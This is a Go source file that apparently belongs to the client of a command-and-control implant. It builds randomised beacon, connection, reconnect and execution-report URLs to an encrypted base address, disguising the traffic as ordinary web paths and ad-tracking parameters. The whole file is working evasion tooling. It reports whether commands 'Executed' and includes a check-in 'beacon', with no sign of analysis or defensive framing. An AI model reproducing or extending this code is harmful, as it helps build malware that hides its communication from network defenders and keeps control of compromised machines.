package httpFuncs

import (
	"fmt"
	"math/rand"
	"src/Client/generic/config"
	"src/Client/generic/logger"

	"github.com/google/uuid"
)

var adDownloadUrlParams = []string{
	"ad_id",
	"ad_group",
	"ad_campaign",
	"ad_creative",
	"ad_position",
	"ad_placement",
	"ad_network",
	"ad_click_id",
	"gcladid",
	"fbclidad",
	"ad_format",
	"ad_size",
	"ad_type",
	"ad_language",
	"ad_region",
	"ad_device",
	"ad_os",
	"ad_sdk_version",
	"ad_tracking_enabled",
	"ad_viewability",
	"ad_click_through_rate",
	"ad_impression",
	"ad_conversion",
	"ad_revenue",
	"ad_targeting",
	"ad_audience",
	"ad_frequency",
	"ad_budget",
	"ad_spend",
	"ad_performance",
	"ad_engagement",
	"ad_clicks",
	"ad_impressions",
	"ad_view_count",
	"ad_view_time",
	"ad_clicks_per_impression",
	"ad_conversion_rate",
	"ad_cost_per_click",
	"ad_cost_per_impression",
}

var webDirectories = []string{
	"about",
	"about-us",
	"account",
	"admin",
	"ads",
	"api",
	"app",
	"archive",
	"assets",
	"auth",
	"backup",
	"blog",
	"booking",
	"browse",
	"build",
	"cache",
	"calendar",
	"cart",
	"catalog",
	"category",
	"cgi-bin",
	"checkout",
	"client",
	"comments",
	"community",
	"config",
	"contact",
	"control-panel",
	"css",
	"dashboard",
	"data",
	"db",
	"debug",
	"default",
	"demo",
	"deploy",
	"dev",
	"docs",
	"download",
	"edit",
	"error",
	"events",
	"example",
	"examples",
	"export",
	"extensions",
	"faq",
	"features",
	"feed",
	"files",
	"forum",
	"gallery",
	"graphics",
	"guestbook",
	"help",
	"history",
	"home",
	"icons",
	"images",
	"img",
	"import",
	"includes",
	"info",
	"install",
	"inventory",
	"invoices",
	"js",
	"json",
	"lang",
	"language",
	"layout",
	"lib",
	"license",
	"links",
	"list",
	"live",
	"local",
	"locale",
	"login",
	"logout",
	"logs",
	"mail",
	"manage",
	"map",
	"media",
	"members",
	"messages",
	"mobile",
	"modules",
	"news",
	"notes",
	"notifications",
	"offline",
	"order",
	"orders",
	"pages",
	"partners",
	"password",
	"pay",
	"payment",
	"photos",
	"plugins",
	"policy",
	"portal",
	"portfolio",
	"posts",
	"preferences",
	"pricing",
	"privacy",
	"profile",
	"projects",
	"public",
	"purchase",
	"queries",
	"query",
	"ratings",
	"register",
	"reports",
	"resources",
	"reviews",
	"rss",
	"sales",
	"scripts",
	"search",
	"secure",
	"security",
	"server",
	"services",
	"settings",
	"shop",
	"signin",
	"signup",
	"site",
	"sitemap",
	"src",
	"static",
	"stats",
	"status",
	"store",
	"style",
	"styles",
	"support",
	"survey",
	"sync",
	"system",
	"tags",
	"tasks",
	"team",
	"terms",
	"test",
	"theme",
	"themes",
	"tmp",
	"tools",
	"tracking",
	"training",
	"translations",
	"uploads",
	"user",
	"users",
	"util",
	"utilities",
	"vendor",
	"videos",
	"web",
	"webhooks",
	"widgets",
	"wiki",
	"work",
	"xml",
	"yaml",
	"zip",
	"zips",
	"assets",
	"static",
	"resources",
	"content",
	"media",
	"images",
}

func generateUUID() string {
	logger.Log("GeneratingUUID")
	return uuid.New().String()
}

func getRandomElement(slice []string) string {
	if len(slice) == 0 {
		logger.Error("getRandomElement: Provided slice is empty")
		return ""
	}
	idx := rand.Intn(len(slice))
	element := slice[idx]
	logger.Log("getRandomElement: Selected element: " + element)
	return element
}

func GenerateURLWithPath(path string) (string, error) {
	// Get URL safely (auto-decrypts if needed)
	baseURL, err := config.GetURL()
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
		return "", fmt.Errorf("failed to get URL: %w", err)
	}
	if baseURL == "" {
		logger.Error("baseURL is not set.")
		return "", fmt.Errorf("baseURL is not set")
	}
	return baseURL + path, nil
}

func GenerateConnectionURL() string {
	logger.Log("generateConnectionURL: Start")
	part1 := getRandomElement(webDirectories)
	part2 := getRandomElement(webDirectories)
	adParam := getRandomElement(adDownloadUrlParams)
	version := rand.Intn(10) + 1
	uuid := generateUUID()

	// Get URL safely (auto-decrypts if needed)
	baseURL, err := config.GetURL()
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
		baseURL = config.URL // Fallback to direct access
	}

	url := fmt.Sprintf("%s/%s/%s/%s/api/v%d?user=%s", baseURL, part1, part2, adParam, version, uuid)
	logger.Log("generateConnectionURL: Generated Connection URL: " + url)
	return url
}

func GenerateReconnectURL() string {
	logger.Log("generateReconnectURL: Start")
	part1 := getRandomElement(webDirectories)
	adParam := getRandomElement(adDownloadUrlParams)
	// version not used in URL formation but generated in C++; kept here for similarity.
	_ = rand.Intn(10) + 1
	uuid := generateUUID()

	// Get URL safely (auto-decrypts if needed)
	baseURL, err := config.GetURL()
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
		baseURL = config.URL // Fallback to direct access
	}

	url := fmt.Sprintf("%s/%s/%s/getLatest?token=%s", baseURL, part1, adParam, uuid)
	logger.Log("generateReconnectURL: Generated Reconnect URL: " + url)
	return url
}

func GenerateBeaconURL() string {
	logger.Log("generateBeaconURL: Start")
	part1 := getRandomElement(webDirectories)
	part2 := getRandomElement(webDirectories)
	version := rand.Intn(10) + 1

	// Get URL and ID safely (auto-decrypts if needed)
	baseURL, err := config.GetURL()
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
		baseURL = config.URL // Fallback to direct access
	}

	clientID, err := config.GetID()
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to get ID: %v", err))
		clientID = config.ID // Fallback to direct access
	}

	url := fmt.Sprintf("%s/checkUpdates/%s/%s?session=%s&v=%d", baseURL, part1, part2, clientID, version)
	logger.Log("generateBeaconURL: Generated Beacon URL: " + url)
	return url
}

func GenerateResponseURL() string {
	logger.Log("generateResponseURL: Start")
	part1 := getRandomElement(webDirectories)
	version := rand.Intn(10) + 1
	executed := rand.Intn(10)+1 > 5
	executedStr := "false"
	if executed {
		executedStr = "true"
	}
	uuid := generateUUID()

	// Get URL safely (auto-decrypts if needed)
	baseURL, err := config.GetURL()
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
		baseURL = config.URL // Fallback to direct access
	}

	url := fmt.Sprintf("%s/updateReport/%s/api/v%d?Executed=%s&responseID=%s", baseURL, part1, version, executedStr, uuid)
	logger.Log("generateResponseURL: Generated Response URL: " + url)
	return url
}
